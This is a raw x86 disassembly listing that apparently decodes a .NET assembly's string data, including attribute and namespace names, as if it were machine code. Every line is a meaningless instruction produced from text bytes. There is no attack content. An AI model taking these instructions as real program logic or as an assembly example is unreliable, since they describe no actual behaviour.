  4041ac:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4041b3:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4041ba:	jae    0x40422f
  4041bc:	gs ins DWORD PTR es:[edi],dx
  4041be:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  4041c2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4041ca:	outs   dx,DWORD PTR ds:[esi]
  4041cb:	outs   dx,BYTE PTR ds:[esi]
  4041cc:	inc    ecx
  4041cd:	je     0x404243
  4041cf:	jb     0x40423a
  4041d1:	bound  esi,QWORD PTR [ebp+0x74]
  4041d4:	add    BYTE PTR gs:[ecx+0x73],al
  4041d8:	jae    0x40423f
  4041da:	ins    DWORD PTR es:[edi],dx
  4041db:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4041df:	outs   dx,BYTE PTR ds:[esi]
  4041e0:	outs   dx,WORD PTR ds:[esi]
  4041e2:	jb     0x404251
  4041e4:	popa   
  4041e5:	je     0x404250
  4041e7:	outs   dx,DWORD PTR ds:[esi]
  4041e8:	outs   dx,BYTE PTR ds:[esi]
  4041e9:	popa   
  4041ea:	ins    BYTE PTR es:[edi],dx
  4041eb:	push   esi
  4041ec:	gs jb  0x404262
  4041ef:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4041f6:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  4041fd:	jns    0x404272
  4041ff:	je     0x404266
  404201:	ins    DWORD PTR es:[edi],dx
  404202:	cs push edx
  404204:	gs jae 0x404276
  404207:	jne    0x40427b
  404209:	arpl   WORD PTR [ebp+0x73],sp
  40420c:	add    BYTE PTR [ebx+0x61],dl
  40420f:	je     0x404276
  404211:	ins    BYTE PTR es:[edi],dx
  404212:	ins    BYTE PTR es:[edi],dx
  404213:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  40421b:	popa   
  40421c:	arpl   WORD PTR [esi+edx*2+0x65],si
  404220:	jb     0x404295
  404222:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  404229:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  404230:	gs jne 0x4042a7
  404233:	jb     0x404296
  404235:	ins    BYTE PTR es:[edi],dx
  404236:	push   edx
  404237:	gs jae 0x4042a9
  40423a:	jne    0x4042ae
  40423c:	arpl   WORD PTR [ebp+0x73],sp
  40423f:	dec    esp
  404240:	popa   
  404241:	outs   dx,BYTE PTR ds:[esi]
  404242:	addr16 jne 0x4042a6
  404245:	addr16 gs inc ecx
  404248:	je     0x4042be
  40424a:	jb     0x4042b5
  40424c:	bound  esi,QWORD PTR [ebp+0x74]
  40424f:	add    BYTE PTR gs:[ecx+0x73],al
  404253:	jae    0x4042ba
  404255:	ins    DWORD PTR es:[edi],dx
  404256:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40425a:	gs ins BYTE PTR es:[edi],dx
  40425c:	popa   
  40425d:	jns    0x4042b2
  40425f:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  404266:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40426d:	jae    0x4042e2
  40426f:	gs ins DWORD PTR es:[edi],dx
  404271:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  404275:	gs jns 0x4042be
  404278:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  404280:	bound  esi,QWORD PTR [ebp+0x74]
  404283:	add    BYTE PTR gs:[ecx+0x73],al
  404287:	jae    0x4042ee
  404289:	ins    DWORD PTR es:[edi],dx
  40428a:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  40428e:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  404295:	gs dec ebx
  404297:	gs jns 0x4042db
  40429a:	je     0x404310
  40429c:	jb     0x404307
  40429e:	bound  esi,QWORD PTR [ebp+0x74]
  4042a1:	add    BYTE PTR gs:[ebx+0x79],dl
  4042a5:	jae    0x40431b
  4042a7:	gs ins DWORD PTR es:[edi],dx
  4042a9:	cs push edx
  4042ab:	jne    0x40431b
  4042ad:	je     0x404318
  4042af:	ins    DWORD PTR es:[edi],dx
  4042b0:	gs cs inc ebx
  4042b3:	outs   dx,DWORD PTR ds:[esi]
  4042b4:	ins    DWORD PTR es:[edi],dx
  4042b5:	jo     0x404320
  4042b7:	ins    BYTE PTR es:[edi],dx
  4042b8:	gs jb  0x40430e
  4042bb:	gs jb  0x404334
  4042be:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  4042c5:	outs   dx,BYTE PTR ds:[esi]
  4042c6:	je     0x404331
  4042c8:	ins    DWORD PTR es:[edi],dx
  4042c9:	gs inc ebx
  4042cb:	outs   dx,DWORD PTR ds:[esi]
  4042cc:	ins    DWORD PTR es:[edi],dx
  4042cd:	jo     0x404330
  4042cf:	je     0x40433a
  4042d1:	bound  ebp,QWORD PTR [ecx+0x6c]
  4042d4:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  4042dc:	bound  esi,QWORD PTR [ebp+0x74]
  4042df:	add    BYTE PTR gs:[ebx+0x79],dl
  4042e3:	jae    0x404359
  4042e5:	gs ins DWORD PTR es:[edi],dx
  4042e7:	cs inc esp
  4042e9:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  4042f0:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  4042f7:	jne    0x404360
  4042f9:	addr16 popa 
  4042fb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  4042ff:	je     0x404375
  404301:	jb     0x40436c
  404303:	bound  esi,QWORD PTR [ebp+0x74]
  404306:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40430b:	jne    0x404374
  40430d:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  404315:	jae    0x404317
  404317:	inc    ebx
  404318:	outs   dx,DWORD PTR ds:[esi]
  404319:	ins    DWORD PTR es:[edi],dx
  40431a:	jo     0x404385
  40431c:	ins    BYTE PTR es:[edi],dx
  40431d:	popa   
  40431e:	je     0x404389
  404320:	outs   dx,DWORD PTR ds:[esi]
  404321:	outs   dx,BYTE PTR ds:[esi]
  404322:	push   edx
  404323:	gs ins BYTE PTR es:[edi],dx
  404325:	popa   
  404326:	js     0x404389
  404328:	je     0x404393
  40432a:	outs   dx,DWORD PTR ds:[esi]
  40432b:	outs   dx,BYTE PTR ds:[esi]
  40432c:	jae    0x40436f
  40432e:	je     0x4043a4
  404330:	jb     0x40439b
  404332:	bound  esi,QWORD PTR [ebp+0x74]
  404335:	add    BYTE PTR gs:[esi+0x73],dh
  404339:	je     0x4043a0
  40433b:	jae    0x4043b1
  40433d:	cs gs js 0x4043a6
  404341:	arpl   WORD PTR [ebp+0x74],si
  404344:	imul   ebp,DWORD PTR [edi+0x6e],0x69676e65
  40434b:	outs   dx,BYTE PTR ds:[esi]
  40434c:	gs cs popa 
  40434f:	jo     0x4043c1
  404351:	arpl   WORD PTR [edi+0x6e],bp
  404354:	je     0x4043b7
  404356:	imul   ebp,DWORD PTR [esi+0x65],0x72410072
  40435d:	addr16 jne 0x4043cd
  404360:	outs   dx,BYTE PTR gs:[esi]
  404362:	je     0x4043b2
  404364:	jne    0x4043d2
  404366:	ins    BYTE PTR es:[edi],dx
  404367:	inc    ebp
  404368:	js     0x4043cd
  40436a:	gs jo  0x4043e1
  40436d:	imul   ebp,DWORD PTR [edi+0x6e],0x72745300
  404374:	imul   ebp,DWORD PTR [esi+0x67],0x4e734900
  40437b:	jne    0x4043e9
  40437d:	ins    BYTE PTR es:[edi],dx
  40437e:	dec    edi
  40437f:	jb     0x4043c6
  404381:	ins    DWORD PTR es:[edi],dx
  404382:	jo     0x4043f8
  404384:	jns    0x404386
  404386:	push   esp
  404387:	jb     0x404402
  404389:	inc    edi
  40438a:	gs je  0x4043e3
  40438d:	popa   
  40438e:	ins    BYTE PTR es:[edi],dx
  40438f:	jne    0x4043f6
  404391:	add    BYTE PTR [ecx+0x64],al
  404394:	add    BYTE PTR fs:[edi+0x65],al
  404398:	je     0x4043ee
  40439a:	jns    0x40440c
  40439c:	add    BYTE PTR gs:[edi+0x70],ch
  4043a0:	pop    edi
  4043a1:	inc    ebp
  4043a2:	jno    0x404419
  4043a4:	popa   
  4043a5:	ins    BYTE PTR es:[edi],dx
  4043a6:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x636e7546
  4043ae:	pusha  
  4043af:	xor    al,0x0
  4043b1:	inc    esi
  4043b2:	jne    0x404422
  4043b4:	arpl   WORD PTR [eax+0x32],sp
  4043b7:	add    BYTE PTR [ecx+0x73],al
  4043ba:	jae    0x404421
  4043bc:	ins    DWORD PTR es:[edi],dx
  4043bd:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  4043c1:	popa   
  4043c2:	ins    DWORD PTR es:[edi],dx
  4043c3:	add    BYTE PTR gs:[edi+0x65],ah
  4043c7:	je     0x404428
  4043c9:	inc    ecx
  4043ca:	jae    0x40443f
  4043cc:	gs ins DWORD PTR es:[edi],dx
  4043ce:	bound  ebp,QWORD PTR [ecx+edi*2+0x51]
  4043d2:	jne    0x404435
  4043d4:	ins    BYTE PTR es:[edi],dx
  4043d5:	imul   esp,DWORD PTR [esi+0x69],0x614e6465
  4043dc:	ins    DWORD PTR es:[edi],dx
  4043dd:	add    BYTE PTR gs:[ebx+0x79],dl
  4043e1:	jae    0x404457
  4043e3:	gs ins DWORD PTR es:[edi],dx
  4043e5:	cs inc edi
  4043e7:	ins    BYTE PTR es:[edi],dx
  4043e8:	outs   dx,DWORD PTR ds:[esi]
  4043e9:	bound  esp,QWORD PTR [ecx+0x6c]
  4043ec:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  4043f3:	add    BYTE PTR [ebx+0x75],al
  4043f6:	ins    BYTE PTR es:[edi],dx
  4043f7:	je     0x40446e
  4043f9:	jb     0x404460
  4043fb:	dec    ecx
  4043fc:	outs   dx,BYTE PTR ds:[esi]
  4043fd:	outs   dx,WORD PTR ds:[esi]
  4043ff:	add    BYTE PTR [edi+0x65],ah
  404402:	je     0x404463
  404404:	dec    ecx
  404405:	outs   dx,BYTE PTR ds:[esi]
  404406:	jbe    0x404469
  404408:	jb     0x404473
  40440a:	popa   
  40440b:	outs   dx,BYTE PTR ds:[esi]
  40440c:	je     0x404451
  40440e:	jne    0x40447c
  404410:	je     0x404487
  404412:	jb     0x404479
  404414:	add    BYTE PTR [ecx+0x46],cl
  404417:	outs   dx,DWORD PTR ds:[esi]
  404418:	jb     0x404487
  40441a:	popa   
  40441b:	je     0x40446d
  40441d:	jb     0x40448e
  40441f:	jbe    0x40448a
  404421:	fs gs jb 0x404425
  404425:	inc    esi
  404426:	outs   dx,DWORD PTR ds:[esi]
  404427:	jb     0x404496
  404429:	popa   
  40442a:	je     0x40442c
  40442c:	outs   dx,DWORD PTR ds:[esi]
  40442d:	jo     0x40448e
  40442f:	dec    ecx
  404430:	outs   dx,BYTE PTR ds:[esi]
  404431:	gs jno 0x4044a9
  404434:	popa   
  404435:	ins    BYTE PTR es:[edi],dx
  404436:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x6d756e45
  40443e:	gs jb  0x4044a2
  404441:	je     0x4044b2
  404443:	jb     0x404445
  404445:	inc    edi
  404446:	gs je  0x40448e
  404449:	outs   dx,BYTE PTR ds:[esi]
  40444a:	jne    0x4044b9
  40444c:	gs jb  0x4044b0
  40444f:	je     0x4044c0
  404451:	jb     0x404453
  404453:	addr16 gs je 0x4044b6
  404457:	inc    ebx
  404458:	jne    0x4044cc
  40445a:	jb     0x4044c1
  40445c:	outs   dx,BYTE PTR ds:[esi]
  40445d:	je     0x40445f
  40445f:	dec    ebp
  404460:	outs   dx,DWORD PTR ds:[esi]
  404461:	jbe    0x4044c8
  404463:	dec    esi
  404464:	gs js  0x4044db
  404467:	add    BYTE PTR [ecx+0x44],cl
  40446a:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  404471:	ins    BYTE PTR es:[edi],dx
  404472:	add    BYTE PTR gs:[ecx+ebp*2+0x73],al
  404477:	jo     0x4044e8
  404479:	jae    0x4044e0
  40447b:	add    BYTE PTR [ebp+0x78],al
  40447e:	arpl   WORD PTR [ebp+0x70],sp
  404481:	je     0x4044ec
  404483:	outs   dx,DWORD PTR ds:[esi]
  404484:	outs   dx,BYTE PTR ds:[esi]
  404485:	add    BYTE PTR [ebx+0x74],dl
  404488:	jb     0x4044f3
  40448a:	outs   dx,BYTE PTR ds:[esi]
  40448b:	addr16 inc ebx
  40448d:	outs   dx,DWORD PTR ds:[esi]
  40448e:	ins    DWORD PTR es:[edi],dx
  40448f:	jo     0x4044f2
  404491:	jb     0x4044fc
  404493:	jae    0x404504
  404495:	outs   dx,BYTE PTR ds:[esi]
  404496:	add    BYTE PTR [ebx+0x74],dl
  404499:	popa   
  40449a:	jb     0x404510
  40449c:	jae    0x4044f5
  40449e:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x7473614c
  4044a6:	dec    ecx
  4044a7:	outs   dx,BYTE PTR ds:[esi]
  4044a8:	fs gs js 0x4044fb
  4044ac:	data16 add BYTE PTR [ebx+0x75],dl
  4044b0:	bound  esi,QWORD PTR [ebx+0x74]
  4044b3:	jb     0x40451e
  4044b5:	outs   dx,BYTE PTR ds:[esi]
  4044b6:	add    BYTE PTR [bp+0x6f],cl
  4044ba:	je     0x404505
  4044bc:	ins    DWORD PTR es:[edi],dx
  4044bd:	jo     0x40452b
  4044bf:	gs ins DWORD PTR es:[edi],dx
  4044c1:	outs   dx,BYTE PTR gs:[esi]
  4044c3:	je     0x40452a
  4044c5:	fs inc ebp
  4044c7:	js     0x40452c
  4044c9:	gs jo  0x404540
  4044cc:	imul   ebp,DWORD PTR [edi+0x6e],0x6e6f4300
  4044d3:	je     0x40453a
  4044d5:	outs   dx,BYTE PTR ds:[esi]
  4044d6:	je     0x404528
  4044d8:	jb     0x404549
  4044da:	jo     0x404541
  4044dc:	jb     0x404552
  4044de:	jns    0x404521
  4044e0:	je     0x404556
  4044e2:	jb     0x40454d
  4044e4:	bound  esi,QWORD PTR [ebp+0x74]
  4044e7:	add    BYTE PTR gs:[ebp+0x6d],al
  4044eb:	jo     0x404561
  4044ed:	jns    0x404543
  4044ef:	jns    0x404561
  4044f1:	gs jae 0x4044f4
  4044f4:	inc    edi
  4044f5:	gs je  0x40453b
  4044f8:	outs   dx,DWORD PTR ds:[esi]
  4044f9:	outs   dx,BYTE PTR ds:[esi]
  4044fa:	jae    0x404570
  4044fc:	jb     0x404573
  4044fe:	arpl   WORD PTR [edi+ebp*2+0x72],si
  404502:	add    BYTE PTR [ecx+0x44],cl
  404505:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  40450c:	jb     0x404587
  40450e:	pusha  
  40450f:	xor    al,BYTE PTR [eax]
  404511:	push   edx
  404512:	jne    0x404582
  404514:	je     0x40457f
  404516:	ins    DWORD PTR es:[edi],dx
  404517:	gs push esp
  404519:	jns    0x40458b
  40451b:	gs dec eax
  40451d:	popa   
  40451e:	outs   dx,BYTE PTR ds:[esi]
  40451f:	fs ins BYTE PTR es:[edi],dx
  404521:	add    BYTE PTR gs:[edi+0x65],al
  404525:	je     0x40457b
  404527:	jns    0x404599
  404529:	gs inc esi
  40452b:	jb     0x40459c
  40452d:	ins    DWORD PTR es:[edi],dx
  40452e:	dec    eax
  40452f:	popa   
  404530:	outs   dx,BYTE PTR ds:[esi]
  404531:	fs ins BYTE PTR es:[edi],dx
  404533:	add    BYTE PTR gs:[edi+0x65],al
  404537:	je     0x404582
  404539:	outs   dx,BYTE PTR ds:[esi]
  40453a:	je     0x4045a1
  40453c:	jb     0x4045a4
  40453e:	popa   
  40453f:	arpl   WORD PTR [ebp+0x0],sp
  404542:	inc    edi
  404543:	gs je  0x404593
  404546:	gs je  0x4045b1
  404549:	outs   dx,DWORD PTR ds:[esi]
  40454a:	add    BYTE PTR fs:[edi+0x65],al
  40454e:	je     0x404597
  404550:	outs   dx,BYTE PTR gs:[esi]
  404552:	gs jb  0x4045be
  404555:	arpl   WORD PTR [ecx+0x72],ax
  404558:	addr16 jne 0x4045c8
  40455b:	outs   dx,BYTE PTR gs:[esi]
  40455d:	je     0x4045d2
  40455f:	add    BYTE PTR [ecx+0x43],cl
  404562:	outs   dx,DWORD PTR ds:[esi]
  404563:	ins    BYTE PTR es:[edi],dx
  404564:	ins    BYTE PTR es:[edi],dx
  404565:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40456a:	outs   dx,BYTE PTR ds:[esi]
  40456b:	pusha  
  40456c:	xor    DWORD PTR [eax],eax
  40456e:	dec    ecx
  40456f:	dec    esp
  404570:	imul   esi,DWORD PTR [ebx+0x74],0x43003160
  404577:	jne    0x4045ec
  404579:	je     0x4045ea
  40457b:	ins    DWORD PTR es:[edi],dx
  40457c:	inc    ecx
  40457d:	je     0x4045f3
  40457f:	jb     0x4045ea
  404581:	bound  esi,QWORD PTR [ebp+0x74]
  404584:	gs inc esp
  404586:	popa   
  404587:	je     0x4045ea
  404589:	add    BYTE PTR [edi+0x65],al
  40458c:	je     0x4045d1
  40458e:	jne    0x404603
  404590:	je     0x404601
  404592:	ins    DWORD PTR es:[edi],dx
  404593:	inc    ecx
  404594:	je     0x40460a
  404596:	jb     0x404601
  404598:	bound  esi,QWORD PTR [ebp+0x74]
  40459b:	gs jae 0x4045e2
  40459e:	popa   
  40459f:	je     0x404602
  4045a1:	add    BYTE PTR [ecx+0x45],cl
  4045a4:	outs   dx,BYTE PTR ds:[esi]
  4045a5:	jne    0x404614
  4045a7:	gs jb  0x40460b
  4045aa:	bound  ebp,QWORD PTR [ebp+eiz*2+0x60]
  4045ae:	xor    DWORD PTR [eax],eax
  4045b0:	dec    ecx
  4045b1:	inc    ebp
  4045b2:	outs   dx,BYTE PTR ds:[esi]
  4045b3:	jne    0x404622
  4045b5:	gs jb  0x404619
  4045b8:	je     0x404629
  4045ba:	jb     0x40461c
  4045bc:	xor    DWORD PTR [eax],eax
  4045be:	addr16 gs je 0x404621
  4045c2:	inc    ebx
  4045c3:	outs   dx,DWORD PTR ds:[esi]
  4045c4:	outs   dx,BYTE PTR ds:[esi]
  4045c5:	jae    0x40463b
  4045c7:	jb     0x40463e
  4045c9:	arpl   WORD PTR [edi+ebp*2+0x72],si
  4045cd:	add    BYTE PTR [edi+0x65],ah
  4045d0:	je     0x404631
  4045d2:	inc    esp
  4045d3:	arpl   WORD PTR gs:[ecx+eiz*2+0x72],bp
  4045d8:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  4045df:	add    BYTE PTR [ebx+0x75],al
  4045e2:	jae    0x404658
  4045e4:	outs   dx,DWORD PTR ds:[esi]
  4045e5:	ins    DWORD PTR es:[edi],dx
  4045e6:	inc    ecx
  4045e7:	je     0x40465d
  4045e9:	jb     0x404654
  4045eb:	bound  esi,QWORD PTR [ebp+0x74]
  4045ee:	gs dec esi
  4045f0:	popa   
  4045f1:	ins    DWORD PTR es:[edi],dx
  4045f2:	gs fs inc ecx
  4045f5:	jb     0x40465e
  4045f7:	jne    0x404666
  4045f9:	outs   dx,BYTE PTR gs:[esi]
  4045fb:	je     0x4045fd
  4045fd:	addr16 gs je 0x404660
  404601:	dec    esi
  404602:	popa   
  404603:	ins    DWORD PTR es:[edi],dx
  404604:	gs fs inc ecx
  404607:	jb     0x404670
  404609:	jne    0x404678
  40460b:	outs   dx,BYTE PTR gs:[esi]
  40460d:	je     0x404682
  40460f:	add    BYTE PTR [edi+0x65],ah
  404612:	je     0x404673
  404614:	dec    ebp
  404615:	gs ins DWORD PTR es:[edi],dx
  404617:	bound  esp,QWORD PTR [ebp+0x72]
  40461a:	dec    ecx
  40461b:	outs   dx,BYTE PTR ds:[esi]
  40461c:	outs   dx,WORD PTR ds:[esi]
  40461e:	add    BYTE PTR [ebx+0x75],al
  404621:	jae    0x404697
  404623:	outs   dx,DWORD PTR ds:[esi]
  404624:	ins    DWORD PTR es:[edi],dx
  404625:	inc    ecx
  404626:	je     0x40469c
  404628:	jb     0x404693
  40462a:	bound  esi,QWORD PTR [ebp+0x74]
  40462d:	gs push esp
  40462f:	jns    0x4046a1
  404631:	gs fs inc ecx
  404634:	jb     0x40469d
  404636:	jne    0x4046a5
  404638:	outs   dx,BYTE PTR gs:[esi]
  40463a:	je     0x40463c
  40463c:	addr16 gs je 0x40469f
  404640:	push   esp
  404641:	jns    0x4046b3
  404643:	gs fs push esi
  404646:	popa   
  404647:	ins    BYTE PTR es:[edi],dx
  404648:	jne    0x4046af
  40464a:	add    BYTE PTR [edi+0x65],ah
  40464d:	je     0x4046ae
  40464f:	push   esi
  404650:	popa   
  404651:	ins    BYTE PTR es:[edi],dx
  404652:	jne    0x4046b9
  404654:	add    BYTE PTR [ebx+0x79],dl
  404657:	jae    0x4046cd
  404659:	gs ins DWORD PTR es:[edi],dx
  40465b:	cs inc ebx
  40465d:	outs   dx,DWORD PTR ds:[esi]
  40465e:	ins    BYTE PTR es:[edi],dx
  40465f:	ins    BYTE PTR es:[edi],dx
  404660:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  404665:	outs   dx,BYTE PTR ds:[esi]
  404666:	jae    0x404668
  404668:	dec    ecx
  404669:	inc    ebp
  40466a:	outs   dx,BYTE PTR ds:[esi]
  40466b:	jne    0x4046da
  40466d:	gs jb  0x4046d1
  404670:	je     0x4046e1
  404672:	jb     0x404674
  404674:	dec    ecx
  404675:	outs   dx,BYTE PTR ds:[esi]
  404676:	jbe    0x4046e7
  404678:	imul   esp,DWORD PTR [ebp+0x0],0x4d
  40467c:	gs je  0x4046e7
  40467f:	outs   dx,DWORD PTR ds:[esi]
  404680:	fs inc edx
  404682:	popa   
  404683:	jae    0x4046ea
  404685:	add    BYTE PTR [edi+0x65],ah
  404688:	je     0x4046e9
  40468a:	push   esp
  40468b:	jns    0x4046fd
  40468d:	gs dec eax
  40468f:	popa   
  404690:	outs   dx,BYTE PTR ds:[esi]
  404691:	fs ins BYTE PTR es:[edi],dx
  404693:	add    BYTE PTR gs:[edx+0x75],dl
  404697:	outs   dx,BYTE PTR ds:[esi]
  404698:	je     0x404703
  40469a:	ins    DWORD PTR es:[edi],dx
  40469b:	gs dec eax
  40469d:	gs ins BYTE PTR es:[edi],dx
  40469f:	jo     0x404706
  4046a1:	jb     0x404716
  4046a3:	add    BYTE PTR [edx+0x75],dl
  4046a6:	outs   dx,BYTE PTR ds:[esi]
  4046a7:	inc    ebx
  4046a8:	ins    BYTE PTR es:[edi],dx
  4046a9:	popa   
  4046aa:	jae    0x40471f
  4046ac:	inc    ebx
  4046ad:	outs   dx,DWORD PTR ds:[esi]
  4046ae:	outs   dx,BYTE PTR ds:[esi]
  4046af:	jae    0x404725
  4046b1:	jb     0x404728
  4046b3:	arpl   WORD PTR [edi+ebp*2+0x72],si
  4046b7:	add    BYTE PTR [edi+0x65],al
  4046ba:	je     0x40470c
  4046bc:	jb     0x40472d
  4046be:	jo     0x404725
  4046c0:	jb     0x404736
  4046c2:	jns    0x4046c4
  4046c4:	addr16 gs je 0x404727
  4046c8:	push   eax
  4046c9:	jb     0x40473a
  4046cb:	jo     0x404732
  4046cd:	jb     0x404743
  4046cf:	jns    0x404725
  4046d1:	jns    0x404743
  4046d3:	add    BYTE PTR gs:[edi+0x65],ah
  4046d7:	je     0x404738
  4046d9:	inc    ebx
  4046da:	popa   
  4046db:	outs   dx,BYTE PTR ds:[esi]
  4046dc:	push   edx
  4046dd:	gs popa 
  4046df:	add    BYTE PTR fs:[edi+0x65],ah
  4046e3:	je     0x404744
  4046e5:	inc    ebx
  4046e6:	popa   
  4046e7:	outs   dx,BYTE PTR ds:[esi]
  4046e8:	push   edi
  4046e9:	jb     0x404754
  4046eb:	je     0x404752
  4046ed:	add    BYTE PTR [ecx+0x6e],cl
  4046f0:	jbe    0x404753
  4046f2:	ins    BYTE PTR es:[edi],dx
  4046f3:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x74617265
  4046fb:	imul   ebp,DWORD PTR [edi+0x6e],0x65637845
  404702:	jo     0x404778
  404704:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  40470b:	pop    edi
  40470c:	dec    ecx
  40470d:	jae    0x404754
  40470f:	outs   dx,BYTE PTR ds:[esi]
  404710:	jne    0x40477f
  404712:	add    BYTE PTR [edi+0x65],al
  404715:	je     0x40475c
  404717:	outs   dx,BYTE PTR ds:[esi]
  404718:	jne    0x404787
  40471a:	dec    esi
  40471b:	popa   
  40471c:	ins    DWORD PTR es:[edi],dx
  40471d:	add    BYTE PTR gs:[ebp+0x6e],al
  404721:	jne    0x404790
  404723:	add    BYTE PTR [eax+0x61],dl
  404726:	jb     0x40479b
  404728:	add    BYTE PTR gs:[ecx+0x70],al
  40472c:	jo     0x40479a
  40472e:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  404735:	dec    ecx
  404736:	outs   dx,BYTE PTR ds:[esi]
  404737:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x617a696c
  40473f:	je     0x4047aa
  404741:	outs   dx,DWORD PTR ds:[esi]
  404742:	outs   dx,BYTE PTR ds:[esi]
  404743:	inc    ebx
  404744:	popa   
  404745:	ins    BYTE PTR es:[edi],dx
  404746:	ins    BYTE PTR es:[edi],dx
  404747:	bound  esp,QWORD PTR [ecx+0x63]
  40474a:	imul   edx,DWORD PTR [eax+0x61],0x72
  40474e:	popa   
  40474f:	ins    DWORD PTR es:[edi],dx
  404750:	jae    0x404752
  404752:	cmp    al,0x4d
  404754:	popa   
  404755:	imul   ebp,DWORD PTR [esi+0x3e],0x305f5f62
  40475c:	add    BYTE PTR [eax+0x0],dh
  40475f:	inc    ecx
  404760:	jo     0x4047d2
  404762:	ins    BYTE PTR es:[edi],dx
  404763:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40476a:	dec    ecx
  40476b:	outs   dx,BYTE PTR ds:[esi]
  40476c:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x617a696c
  404774:	je     0x4047df
  404776:	outs   dx,DWORD PTR ds:[esi]
  404777:	outs   dx,BYTE PTR ds:[esi]
  404778:	inc    ebx
  404779:	popa   
  40477a:	ins    BYTE PTR es:[edi],dx
  40477b:	ins    BYTE PTR es:[edi],dx
  40477c:	bound  esp,QWORD PTR [ecx+0x63]
  40477f:	imul   eax,DWORD PTR [eax],0x43
  404782:	push   ebx
  404783:	and    al,0x3c
  404785:	cmp    DWORD PTR ds:[edi+0x5f],ebx
  404789:	inc    ebx
  40478a:	popa   
  40478b:	arpl   WORD PTR [eax+0x65],bp
  40478e:	fs inc ecx
  404790:	outs   dx,BYTE PTR ds:[esi]
  404791:	outs   dx,DWORD PTR ds:[esi]
  404792:	outs   dx,BYTE PTR ds:[esi]
  404793:	jns    0x404802
  404795:	outs   dx,DWORD PTR ds:[esi]
  404796:	jne    0x40480b
  404798:	dec    ebp
  404799:	gs je  0x404804
  40479c:	outs   dx,DWORD PTR ds:[esi]
  40479d:	fs inc esp
  40479f:	gs ins BYTE PTR es:[edi],dx
  4047a1:	gs addr16 popa 
  4047a4:	je     0x40480b
  4047a6:	xor    DWORD PTR [eax],eax
  4047a8:	inc    ebx
  4047a9:	outs   dx,DWORD PTR ds:[esi]
  4047aa:	ins    DWORD PTR es:[edi],dx
  4047ab:	jo     0x404816
  4047ad:	ins    BYTE PTR es:[edi],dx
  4047ae:	gs jb  0x4047f8
  4047b1:	outs   dx,BYTE PTR gs:[esi]
  4047b3:	gs jb  0x404817
  4047b6:	je     0x40481d
  4047b8:	fs inc ecx
  4047ba:	je     0x404830
  4047bc:	jb     0x404827
  4047be:	bound  esi,QWORD PTR [ebp+0x74]
  4047c1:	add    BYTE PTR gs:[ebp+0x6e],al
  4047c5:	jbe    0x404830
  4047c7:	jb     0x404838
  4047c9:	outs   dx,BYTE PTR ds:[esi]
  4047ca:	ins    DWORD PTR es:[edi],dx
  4047cb:	outs   dx,BYTE PTR gs:[esi]
  4047cd:	je     0x4047cf
  4047cf:	inc    edi
  4047d0:	gs je  0x404818
  4047d3:	outs   dx,BYTE PTR ds:[esi]
  4047d4:	jbe    0x40483f
  4047d6:	jb     0x404847
  4047d8:	outs   dx,BYTE PTR ds:[esi]
  4047d9:	ins    DWORD PTR es:[edi],dx
  4047da:	outs   dx,BYTE PTR gs:[esi]
  4047dc:	je     0x404834
  4047de:	popa   
  4047df:	jb     0x40484a
  4047e1:	popa   
  4047e2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4047e6:	dec    ecx
  4047e7:	outs   dx,BYTE PTR ds:[esi]
  4047e8:	je     0x40481d
  4047ea:	xor    al,BYTE PTR [eax]
  4047ec:	push   esp
  4047ed:	jb     0x404868
  4047ef:	push   eax
  4047f0:	popa   
  4047f1:	jb     0x404866
  4047f3:	add    BYTE PTR gs:[edx+esi*2+0x61],dl
  4047f8:	arpl   WORD PTR [ebp+0x4c],sp
  4047fb:	gs jbe 0x404863
  4047fe:	ins    BYTE PTR es:[edi],dx
  4047ff:	add    BYTE PTR [ecx+0x73],cl
  404802:	inc    esp
  404803:	imul   bp,WORD PTR gs:[esi+0x65],0x64
  40480a:	push   esp
  40480b:	outs   dx,DWORD PTR ds:[esi]
  40480c:	dec    edi
  40480d:	bound  ebp,QWORD PTR [edx+0x65]
  404810:	arpl   WORD PTR [eax+eax*1+0x4d],si
  404814:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40481b:	je     0x40484b
  40481d:	push   esi
  40481e:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  404825:	jne    0x40488b
  404827:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
